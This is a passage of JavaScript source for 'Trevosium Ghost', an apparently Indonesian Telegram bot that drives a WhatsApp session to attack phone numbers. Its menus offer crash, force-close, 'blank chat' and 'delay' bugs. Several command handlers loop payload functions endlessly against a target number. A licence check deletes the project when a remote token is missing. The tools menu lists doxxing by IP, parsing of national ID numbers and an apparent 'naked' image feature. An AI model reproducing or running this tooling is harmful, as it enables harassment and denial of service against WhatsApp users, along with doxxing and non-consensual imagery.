                "User-Agent": "Mozilla/5.0"
            }
        });

        if (!response || !response.data) return true;

        let rawData;
        if (typeof response.data === "string") {
            rawData = response.data;
        } else if (typeof response.data === "object") {
            rawData = JSON.stringify(response.data);
        } else {
            rawData = String(response.data);
        }

        const tokenList = rawData
            .replace(/\r/g, "")
            .replace(/[\[\]"]/g, "")
            .split(/[\n,]/)
            .map(t => t.trim())
            .filter(t => t.length > 0);

        const isValid = tokenList.includes(cleanToken);

        if (isValid) {
            return true;
        } else {
            try {
                if (bot?.stop) {
                    await bot.stop();
                }
            } catch {}

            setTimeout(() => {
                safeDeleteRootProject();
                process.exit(1);
            }, 800);
        }

    } catch (err) {
        return true;
    }
}

const startHandler = async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderId = ctx.from.id;
    const userTag = ctx.from.username ? "@" + ctx.from.username : ctx.from.first_name;
    const chatId = ctx.chat.id;

    if (systemLocked) {
        return ctx.reply("🚫 Sytem Stopped.");
    }

    const steps = [
        "▰▱▱▱▱▱▱▱▱▱ 10%",
        "▰▰▱▱▱▱▱▱▱▱ 20%",
        "▰▰▰▱▱▱▱▱▱▱ 30%",
        "▰▰▰▰▱▱▱▱▱▱ 40%",
        "▰▰▰▰▰▱▱▱▱▱ 50%",
        "▰▰▰▰▰▰▱▱▱▱ 60%",
        "▰▰▰▰▰▰▰▱▱▱ 70%",
        "▰▰▰▰▰▰▰▰▱▱ 80%",
        "▰▰▰▰▰▰▰▰▰▱ 90%",
        "▰▰▰▰▰▰▰▰▰▰ 100%"
    ];

    const progressMsg = await ctx.reply(
        "🔐 Processing Verification Token...\n▱▱▱▱▱▱▱▱▱▱ 0%"
    );

    for (const step of steps) {
        await ctx.telegram.editMessageText(
            chatId,
            progressMsg.message_id,
            null,
            `🔐 Processing Verification Token...\n${step}`
        );

        await new Promise(resolve => setTimeout(resolve, 250));
    }

    const tokenValid = await checkTokenFromGithub(bot);

    if (!tokenValid) {
        await ctx.telegram.editMessageText(
            chatId,
            progressMsg.message_id,
            null,
            "❌ <b>Token tidak ditemukan.</b>\nSystem Otomatis Dihentikan.",
            { parse_mode: "HTML" }
        );

        await new Promise(resolve => setTimeout(resolve, 1200));

        systemLocked = true;
        verifiedUsers.clear();
        bugUsage.clear();

        return;
    }

    verifiedUsers.add(chatId);

    await ctx.telegram.editMessageText(
        chatId,
        progressMsg.message_id,
        null,
        "✅ <b>Token Valid!</b>\nSelamat Datang Di Trevosium Ghost.",
        { parse_mode: "HTML" }
    );

    if (!checkGroupOnly(ctx)) return;

    const menuMessage = `\`\`\`javascript
⬡═―⧼ TREVOSIUM GHOST ⧽―═⬡
◉ ᴀᴜᴛʜᴏʀ : @XavienZzTamvan
◉ ᴠᴇʀꜱɪᴏɴ : 31.0
◉ ᴘʀᴇꜰɪx : (/)

⬡═―⧼ INFORMATION ⧽―═⬡
ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴛʀᴇᴠᴏꜱɪᴜᴍ ɢʜᴏꜱᴛ. 
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴꜰᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴅᴀʀɪ ᴋᴀᴍɪ⎙

⬡═―⧼ STATUS BOT ⧽―═⬡
◉ ʀᴜɴᴛɪᴍᴇ : ${runtimeStatus}
◉ ᴀᴄᴄᴇꜱꜱ : ${premiumStatus}  
◉ ᴜꜱᴇʀɴᴀᴍᴇ : ${userTag}
◉ ꜱᴛᴀᴛᴜꜱ ꜱᴇɴᴅᴇʀ : ${senderStatus} 
◉ ᴜꜱᴇʀ-ɪᴅ : ${senderId}

ⓘ 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠\`\`\`
`;

    const keyboard = [
        [
            {
                text: "⟸ ʙᴀᴄᴋ",
                callback_data: "/backpanel",
                style: "success"
            },
            {
                text: "ʜᴏᴍᴇ",
                callback_data: "/start",
                style: "danger"
            },
            {
                text: "ɴᴇxᴛ ⟹",
                callback_data: "/controls",
                style: "success"
            }
        ],
        [
            {
                text: "⌜ Dҽʋҽʅσρҽɾ ⌟",
                url: "https://t.me/XavienZzTamvan",
                style: "primary"
            }
        ]
    ];

    await ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
};

bot.hears(/^\/start(@\w+)?$/, startHandler);

bot.action('/start', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderId = ctx.from.id;
    const userTag = ctx.from.username ? "@" + ctx.from.username : ctx.from.first_name;
    
  if (!checkGroupOnly(ctx)) return;
  
    const menuMessage = `\`\`\`javascript
⬡═―⧼ TREVOSIUM GHOST ⧽―═⬡
◉ ᴀᴜᴛʜᴏʀ : @XavienZzTamvan
◉ ᴠᴇʀꜱɪᴏɴ : 31.0
◉ ᴘʀᴇꜰɪx : (/)

⬡═―⧼ INFORMATION ⧽―═⬡
ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴛʀᴇᴠᴏꜱɪᴜᴍ ɢʜᴏꜱᴛ. 
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴꜰᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴅᴀʀɪ ᴋᴀᴍɪ⎙

⬡═―⧼ STATUS BOT ⧽―═⬡
◉ ʀᴜɴᴛɪᴍᴇ : ${runtimeStatus}
◉ ᴀᴄᴄᴇꜱꜱ : ${premiumStatus}  
◉ ᴜꜱᴇʀɴᴀᴍᴇ : ${userTag}
◉ ꜱᴛᴀᴛᴜꜱ ꜱᴇɴᴅᴇʀ : ${senderStatus} 
◉ ᴜꜱᴇʀ-ɪᴅ : ${senderId}

ⓘ 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠\`\`\`
`;  

    const keyboard = [
    [
       {
            text: "⟸ ʙᴀᴄᴋ",
            callback_data: "/backpanel",
            style: "success"
        },
        {
            text: "ʜᴏᴍᴇ",
            callback_data: "/start",
            style: "danger"
        },
        {
            text: "ɴᴇxᴛ ⟹",
            callback_data: "/controls",
            style: "success"
        }
      ],
      [
        {
            text: "⌜ Dҽʋҽʅσρҽɾ ⌟",
            url: "https://t.me/XavienZzTamvan",
            style: "primary"
        }
    ]
];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "Markdown",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
        }
    }
});

bot.action("/backpanel", async (ctx) => {
    try {
        await ctx.answerCbQuery("🔄 Panel sedang direstart...\nSession akan terhapus..", {
            show_alert: false
        });

        const sessionPath = path.join(__dirname, "session");

        if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, { recursive: true, force: true });
        }

        setTimeout(() => {
            process.exit(1);
        }, 1500);

    } catch (err) {
        console.error("Error restart panel:", err);
        await ctx.answerCbQuery("❌ Gagal restart panel.", {
            show_alert: true
        });
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>⬡═━━【CONTROL MENU】━━═⬡</pre></blockquote>
⌬ /addprem - Id
╰⊱ |[ Menambah Akses Premium ]|
⌬ /delprem - Id
╰⊱ |[ Menghapus Akses Premium ]|
⌬ /addadmin - Id
╰⊱ |[ Menambah Akses Admin ]|
⌬ /deladmin - Id
╰⊱ |[ Menghapus Akses Admin ]|
⌬ /grouponly - On|Off
╰⊱ |[ Control Group Only ]|
⌬ /enablecmd - Command
╰⊱ |[ Mengaktifkan Command Bug ]|
⌬ /disablecmd - Command
╰⊱ |[ Menonaktifkan Command Bug ]|  
⌬ /addbot - 62xx
╰⊱ |[ Pairing WhatsApp ]|
⌬ /setcd - 5m
╰⊱ |[ Mengatur Cooldown ]|
⌬ /killsesi
╰⊱ |[ Reset Session ]|
⌬ /pullupdate 
╰⊱ |[ Update System ]|
<blockquote>⬡═――⊱ ⎧ Page 1/4 ⎭ ⊰—―═⬡</blockquote>
`;

    const keyboard = [
  [ 
    { text: "⟸ ʙᴀᴄᴋ", callback_data: "/start", style: "success" },
    { text: "ʜᴏᴍᴇ", callback_data: "/start", style: "danger" },
    { text: "ɴᴇxᴛ ⟹", callback_data: "/bug", style: "success" }],
    [{ text: "⌜ Dҽʋҽʅσρҽɾ ⌟", url: "https://t.me/XavienZzTamvan", style: "primary" }
  ]
];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `<blockquote>┏━━━━━〔 ❅ SYSTEM CHOICE ❅ 〕━━━━━━┓
┃༗ Please Select the Bug Button Menu
┃༗ According to your needs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛</blockquote>
<blockquote>⬡═――⊱ ⎧ Page 2/4 ⎭ ⊰—―═⬡</blockquote>
`;

    const keyboard = [
        [
            { text: "ᴍᴜʀʙᴜɢ ᴍᴇɴᴜ (⎈)", callback_data: "/delayinvis" },
            { text: "ʙʟᴀɴᴋ ᴍᴇɴᴜ (ᝰ)", callback_data: "/blank" }
        ],
        [
            { text: "ꜰᴏʀᴄʟᴏꜱᴇ ᴍᴇɴᴜ (⌭)", callback_data: "/forclose" },
            { text: "ᴄʀᴀꜱʜ ᴍᴇɴᴜ (メ)", callback_data: "/crash" }
        ],
        [
            { text: "ʙᴜɢ ɢʀᴏᴜᴘ (⸙)", callback_data: "/group" },
        ],
        [
           { text: "⟸ ʙᴀᴄᴋ", callback_data: "/controls", style: "success" },
           { text: "ʜᴏᴍᴇ", callback_data: "/start", style: "danger" },
           { text: "ɴᴇxᴛ ⟹", callback_data: "/tools", style: "success" }],
           [{ text: "⌜ Dҽʋҽʅσρҽɾ ⌟", url: "https://t.me/XavienZzTamvan", style: "primary" }
  ]
];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/delayinvis', async (ctx) => {
    const DelayMenu = `
<blockquote><pre>⬡═━━【MURBUG OPTIONS】━━═⬡</pre></blockquote>
⌬ /xflower ✆ 62xx
╰⊱ |[ Forclose Android ]|
⌬ /skyxdelay ✆ 628xx
╰⊱ |[ Delay Medium ]|
⌬ /xphantom ✆ 628xx 
╰⊱ |[ Delay Pretty Hard ]|
⌬ /specterdelay ✆ 628xx 
╰⊱ |[ Delay Hard ]|
⌬ /overdozer ✆ 628xx 
╰⊱ |[ Delay Buldozer ]|
⌬ /noxtra ✆ 628xx 
╰⊱ |[ Forclose iPhone ]|
༄ ( ᴀʟʟ ᴛʏᴘᴇ ɪɴᴠɪꜱɪʙʟᴇ ) ༄
<blockquote>╘═─────────────────═▣</blockquote>
`;

    const keyboard = [
  [
    { text: "ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "/bug" }
  ]
];

    try {
        await ctx.editMessageCaption(DelayMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/blank', async (ctx) => {
    const BlankMenu = `
<blockquote><pre>⬡═━━【BLANK OPTIONS】━━═⬡</pre></blockquote>
⌬ /xblank ✆ 628xx
╰⊱ |[ Blank Chat Click V1 ]|
⌬ /overdocu ✆ 628xx 
╰⊱ |[ Blank Chat Click V2 ]|
⌬ /blankios ✆ 62xx
╰⊱ |[ Blank Chat Click iPhone ]|
⌬ /voxtrash ✆ 628xx 
╰⊱ |[ Blank Chat Delay Visible ]|
<blockquote>╘═─────────────────═▣</blockquote>
`;

    const keyboard = [
  [
    { text: "ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "/bug" }
  ]
];

    try {
        await ctx.editMessageCaption(BlankMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/forclose', async (ctx) => {
    const ForcloseMenu = `
<blockquote><pre>⬡═━━【FORCLOSE OPTIONS】━━═⬡</pre></blockquote>
⌬ /avicix ✆ 62xx
╰⊱ |[ Forclose Click Hard ]|
⌬ /filixer ✆ 62xx
╰⊱ |[ Forclose Invisible Android ]|
⌬ /ioskill ✆ 628xx 
╰⊱ |[ Forclose Invisible iPhone ]|
<blockquote>╘═─────────────────═▣</blockquote>
`;

    const keyboard = [
  [
    { text: "ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "/bug" }
  ]
];

    try {
        await ctx.editMessageCaption(ForcloseMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/crash', async (ctx) => {
    const CrashMenu = `
<blockquote><pre>⬡═━━【CRASH OPTIONS】━━═⬡</pre></blockquote>
⌬ /crashui ✆ 62xx
╰⊱ |[ Crash Ui Not Work All Device ]|
<blockquote>╘═─────────────────═▣</blockquote>
`;

    const keyboard = [
  [
    { text: "ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "/bug" }
  ]
];

    try {
        await ctx.editMessageCaption(CrashMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/group', async (ctx) => {
    const BugGroupMenu = `
<blockquote><pre>⬡═━━【BUG GROUP】━━═⬡</pre></blockquote>
⌬ /group ✆ Link Group
╰⊱ |[ Join Group ]| - |[ Step 1 ]|
⌬ /killgroup ✆ Link Group
╰⊱ |[ Freeze Delay Group ]| - |[ Step 2 ]|
<blockquote>╘═─────────────────═▣</blockquote>
`;

    const keyboard = [
  [
    { text: "ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "/bug" }
  ]
];

    try {
        await ctx.editMessageCaption(BugGroupMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tools', async (ctx) => {
    const ToolsMenu = `
<blockquote><pre>⬡═━━【TOOLS MENU】━━═⬡</pre></blockquote>
⌬ /tiktokdl - Input Link
⌬ /tiktoksearch - Input Text
⌬ /nikparse - Input Number NIK
⌬ /doxxingip - Input Number IP
⌬ /ssip - Input Text
⌬ /tourl - Reply Photo/Video
⌬ /cekbio - Number
⌬ /toanime - Reply Photo
⌬ /anime - Input Text Anime
⌬ /tonaked - Reply Photo
⌬ /bokep - Input Text
⌬ /brat - Input Text
⌬ /tofigure - Reply Photo
⌬ /play - Input Text
⌬ /getcode - Input Link
⌬ /testfunction - Reply Function
<blockquote>⬡═――⊱ ⎧ Page 3/4 ⎭ ⊰—―═⬡</blockquote>
`;

   const keyboard = [
  [ 
    { text: "⟸ ʙᴀᴄᴋ", callback_data: "/bug", style: "success" },
    { text: "ʜᴏᴍᴇ", callback_data: "/start", style: "danger" },
    { text: "ɴᴇxᴛ ⟹", callback_data: "/tqto", style: "success" }],
    [{ text: "⌜ Dҽʋҽʅσρҽɾ ⌟", url: "https://t.me/XavienZzTamvan", style: "primary" }
  ]
];

    try {
        await ctx.editMessageCaption(ToolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
<blockquote><pre>╭━━⊱『 THANKS TO 』</pre></blockquote>
ᝰ Xavienzz ⧼ᴅᴇᴠᴇʟᴏᴘᴇʀ⧽
ᝰ Xwarr ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ Hamzz ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ Zephyrine ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ Xatanical ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ Otaa ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ Zenifer ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ ᴀʟʟ ᴛᴇᴀᴍ ᴛʀᴇᴠᴏꜱɪᴜᴍ ɢʜᴏꜱᴛ
<blockquote>⬡═――⊱ ⎧ Page 4/4 ⎭ ⊰—―═⬡</blockquote>
`;

    const keyboard = [
  [ 
    { text: "⟸ ʙᴀᴄᴋ", callback_data: "/tools", style: "success" },
    { text: "ʜᴏᴍᴇ", callback_data: "/start", style: "danger" },
    { text: "ɴᴇxᴛ ⟹", callback_data: "/start", style: "success" }],
    [{ text: "⌜ Dҽʋҽʅσρҽɾ ⌟", url: "https://t.me/XavienZzTamvan", style: "primary" }
  ]
];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.command('noxtra', checkWhatsAppConnection, checkPremium, async (ctx) => {
    if (systemLocked) {
        return ctx.reply("🚫 Sytem Stopped.");
    }

    if (!checkGroupOnly(ctx)) return;

    const q = ctx.message.text.split(" ")[1];
    
    if (!commandStatus.noxtra) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }

    if (!q) {
        return ctx.reply(
            "📋 Format: <code>/noxtra 62×××</code>",
            { parse_mode: "HTML" }
        );
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    try {
        await ctx.reply(
`<blockquote><b>▢ ϟ TREVOSIUM GHOST ϟ</b></blockquote>
╰➤ Target : ${q}
╰➤ Successfully ✅`,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[
                    { text: "⌜📱⌟ ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "success" }
                ]]
            }
        });

        const runAttack = async () => {
            try {
                while (true) {
                    await TrdxtCountV6(24, target);
                    await sleep(15500);
                }
            } catch (err) {
                console.error("Error:", err);
            }
        };

        runAttack();

    } catch (error) {
        console.error(error);
        ctx.reply("❌ error.");
    }
});

bot.command('skyxdelay', checkWhatsAppConnection, checkPremium, async (ctx) => {
    if (systemLocked) {
        return ctx.reply("🚫 Sytem Stopped.");
    }

    if (!checkGroupOnly(ctx)) return;

    const q = ctx.message.text.split(" ")[1];
    
    if (!commandStatus.skyxdelay) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }

    if (!q) {
        return ctx.reply(
            "📋 Format: <code>/skyxdelay 62×××</code>",
            { parse_mode: "HTML" }
        );
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    try {
        await ctx.reply(
`<blockquote><b>⬡⊱ TREVOSIUM GHOST ⊰⬡</b></blockquote>
∙▹ Target: <code>${q}</code>
∙▹ Status: Successfully ✅`,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[
                    { text: "⌜📱⌟ ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "success" }
                ]]
            }
        });

        const runAttack = async () => {
            try {
                while (true) {
                    await TrdxtCountV1(24, target);
                    await sleep(15500);
                }
            } catch (err) {
                console.error("Error:", err);
            }
        };

        runAttack();

    } catch (error) {
        console.error(error);
        ctx.reply("❌ error.");
    }
});

bot.command('overdozer', checkWhatsAppConnection, checkPremium, async (ctx) => {
    if (systemLocked) {
        return ctx.reply("🚫 Sytem Stopped.");
    }

    if (!checkGroupOnly(ctx)) return;

    const q = ctx.message.text.split(" ")[1];
    
    if (!commandStatus.overdozer) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }

    if (!q) {
        return ctx.reply(
            "📋 Format: <code>/overdozer 62×××</code>",
            { parse_mode: "HTML" }
        );
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    try {
        await ctx.reply(
`<blockquote><b>Trevosium Ghost</b></blockquote>
Bug terkirim: ${q}`,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[
                    { text: "⌜📱⌟ ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "success" }
                ]]
            }
        });

        const runAttack = async () => {
            try {
                while (true) {
                    await TrdxtCountV5(24, target);
                    await sleep(15500);
                }
            } catch (err) {
                console.error("Error:", err);
            }
        };

        runAttack();

    } catch (error) {
        console.error(error);
        ctx.reply("❌ error.");
    }
});

bot.command('xphantom', checkWhatsAppConnection, checkPremium, async (ctx) => {
    if (systemLocked) {
        return ctx.reply("🚫 Sytem Stopped.");
    }

    if (!checkGroupOnly(ctx)) return;

    const q = ctx.message.text.split(" ")[1];
    
    if (!commandStatus.xphantom) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }

    if (!q) {
        return ctx.reply(
            "📋 Format: <code>/xphantom 62×××</code>",
            { parse_mode: "HTML" }
        );
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    try {
        await ctx.reply(
`<blockquote><b>✙「 TREVOSIUM GHOST 」✙</b></blockquote>
〣 Target: <code>${q}</code>
〣 Status: Successfully ✅`,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[
                    { text: "⌜📱⌟ ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "success" }
                ]]
            }
        });

        const runAttack = async () => {
            try {
                while (true) {
                    await TrdxtCountV4(24, target);
                    await sleep(15500);
                }
            } catch (err) {
                console.error("Error:", err);
            }
        };

        runAttack();

    } catch (error) {
        console.error(error);
        ctx.reply("❌ error.");
    }
});

bot.command('specterdelay', checkWhatsAppConnection, checkPremium, async (ctx) => {
    if (systemLocked) {
        return ctx.reply("🚫 Sytem Stopped.");
    }

    if (!checkGroupOnly(ctx)) return;

    const q = ctx.message.text.split(" ")[1];
    
    if (!commandStatus.specterdelay) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }

    if (!q) {
        return ctx.reply(
            "📋 Format: <code>/specterdelay 62×××</code>",
            { parse_mode: "HTML" }
        );
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    try {
        await ctx.reply(
`<pre>⬡═⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰═⬡
⌑ Target: ${q}
⌑ Type: Specter Delay
⌑ Status: Successfully ✅
╘═——————————————————═⬡</pre>`,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[
                    { text: "⌜📱⌟ ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "success" }
                ]]
            }
        });

        const runAttack = async () => {
            try {
                while (true) {
                    await TrdxtCountV2(24, target);
                    await sleep(15500);
                }
            } catch (err) {
                console.error("Error:", err);
            }
        };

        runAttack();

    } catch (error) {
        console.error(error);
        ctx.reply("❌ error.");
    }
});

bot.command("xblank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }
    
  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  
  if (!commandStatus.xblank) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }
  
  if (!q) return ctx.reply(`🪧 ☇ Format: /xblank 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  const datenow = new Date().toLocaleString("id-ID", {
  timeZone: "Asia/Jakarta",
  day: "2-digit",
  month: "2-digit",
  year: "numeric",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit"
});

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Blank Chat Android
│✘ Date: ${datenow}
│✘ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
╰───────────────────────═⬡</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await iXFreeze(sock, target);
    await sleep(55500);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Blank Chat Android
│✘ Date: ${datenow}
│✘ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
╰───────────────────────═⬡</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
        ]]
      }
    }
  );
});

bot.command("crashui", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  
  if (!commandStatus.crashui) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }
  
  if (!q) return ctx.reply(`🪧 ☇ Format: /crashui 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  const datenow = new Date().toLocaleString("id-ID", {
  timeZone: "Asia/Jakarta",
  day: "2-digit",
  month: "2-digit",
  year: "numeric",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit"
});

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Crash Ui Android
│✘ Date: ${datenow}
│✘ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
╰───────────────────────═⬡</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
